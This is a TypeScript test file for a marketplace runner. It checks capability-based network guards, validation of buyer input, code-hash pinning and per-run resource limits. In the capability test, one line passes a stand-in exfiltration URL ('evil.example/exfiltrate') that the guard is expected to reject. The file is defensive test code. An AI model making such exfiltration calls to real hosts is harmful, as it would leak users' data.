import { test } from 'node:test';
import assert from 'node:assert/strict';
import { readFileSync, readdirSync, writeFileSync, mkdtempSync, mkdirSync, cpSync } from 'node:fs';
import { join } from 'node:path';
import { tmpdir } from 'node:os';
import { fileURLToPath } from 'node:url';
import { guardedFetch, validateInputs, parseRewrites, HANDLERS } from '../runner/src/executor.js';
import { computeCodehash } from '../core/src/codehash.js';
import type { Catalog, FormField } from '../core/src/frs.js';

const root = fileURLToPath(new URL('..', import.meta.url));

test('parts can only reach hosts they declare (capability guard)', async () => {
  const f = guardedFetch('filter.dust@1.0.0', [], new Map());
  await assert.rejects(() => f('https://evil.example/exfiltrate'), /capability violation/);
  const g = guardedFetch('x', ['net:api.fastnear.com'], new Map());
  await assert.rejects(() => g('https://cloud-api.near.ai/v1/models'), /capability violation/);
});

test('every catalog part has a runner implementation', () => {
  const cat = JSON.parse(readFileSync(join(root, 'standard/parts.json'), 'utf8')) as Catalog;
  for (const b of cat.parts) assert.ok(HANDLERS[b.id], `no handler for ${b.id}`);
});

test('buyer inputs are validated against the public form', () => {
  const form: FormField[] = [{ id: 'wallet', label: 'Wallet', type: 'near.account', required: true }, { id: 't', label: 'T', type: 'usd' }, { id: 'a', label: 'A', type: 'asset.id', options: ['x', 'y'] }];
  assert.deepEqual(validateInputs(form, { wallet: 'bob.testnet', t: 3, a: 'x' }), []);
  assert.equal(validateInputs(form, { wallet: 'Bad Account!', t: -1, a: 'z' }).length, 3);
  assert.deepEqual([...parseRewrites('a.com=http://x/y,b.com=http://z')], [['a.com', 'http://x/y'], ['b.com', 'http://z']]);
});

test('the marketplace server never touches plaintext recipes', () => {
  for (const f of readdirSync(join(root, 'server/src'))) {
    const src = readFileSync(join(root, 'server/src', f), 'utf8');
    assert.ok(!src.includes('seed/recipes'), `${f} must not read seed recipes`);
    assert.ok(!/import\s*\{[^}]*\bopen\b[^}]*\}\s*from\s*'[./]*core\/src\/(seal|index)/.test(src), `${f} must not import the decryption function`);
  }
});

test('code hash is stable across line endings and changes when code changes', () => {
  const dir = mkdtempSync(join(tmpdir(), 'frs-'));
  for (const d of ['runner/src', 'core/src', 'standard']) mkdirSync(join(dir, d), { recursive: true });
  cpSync(join(root, 'runner/src'), join(dir, 'runner/src'), { recursive: true });
  cpSync(join(root, 'core/src'), join(dir, 'core/src'), { recursive: true });
  cpSync(join(root, 'standard/parts.json'), join(dir, 'standard/parts.json'));
  cpSync(join(root, 'standard/jobs.json'), join(dir, 'standard/jobs.json'));
  const a = computeCodehash(dir).codehash;
  assert.equal(a, computeCodehash(root).codehash);
  const f = join(dir, 'runner/src/types.ts');
  writeFileSync(f, readFileSync(f, 'utf8').replace(/\n/g, '\r\n'));
  assert.equal(computeCodehash(dir).codehash, a, 'CRLF checkout gives the same hash');
  writeFileSync(f, readFileSync(f, 'utf8') + '\n// tampered');
  assert.notEqual(computeCodehash(dir).codehash, a);
});

test('AUDITED_CODEHASH is pinned to the current runner source (run `npm run pin-codehash` after reviewing changes)', () => {
  assert.equal(readFileSync(join(root, 'AUDITED_CODEHASH'), 'utf8').trim(), computeCodehash(root).codehash);
});

test('per-run resource limits: http calls, model calls, time (approval wait excluded) and output size', async () => {
  const { enforceLimits } = await import('../runner/src/limits.js');
  const m = (limits: object) => ({ id: 'x@1', limits: { max_ms: 200, max_http_calls: 2, max_model_calls: 1, max_output_bytes: 50, ...limits } }) as any;
  const ok = async () => new Response('{}');
  await assert.rejects(() => enforceLimits(m({}), ok, async (http) => { await http('https://a.b/1'); await http('https://a.b/2'); await http('https://a.b/3'); return {}; }), /max_http_calls/);
  await assert.rejects(() => enforceLimits(m({ max_http_calls: 9 }), ok, async (http) => { await http('https://cloud-api.near.ai/v1/chat/completions'); await http('https://cloud-api.near.ai/v1/chat/completions'); return {}; }), /max_model_calls/);
  await assert.rejects(() => enforceLimits(m({}), ok, () => new Promise((r) => setTimeout(() => r({}), 500))), /max_ms/);
  const waited = await enforceLimits(m({}), ok, async (_h, approval) => { await approval(() => new Promise((r) => setTimeout(r, 400))); return { done: true }; });
  assert.deepEqual(waited, { done: true }, 'time waiting for the wallet does not count');
  await assert.rejects(() => enforceLimits(m({}), ok, async () => ({ big: 'x'.repeat(100) })), /max_output_bytes/);
});
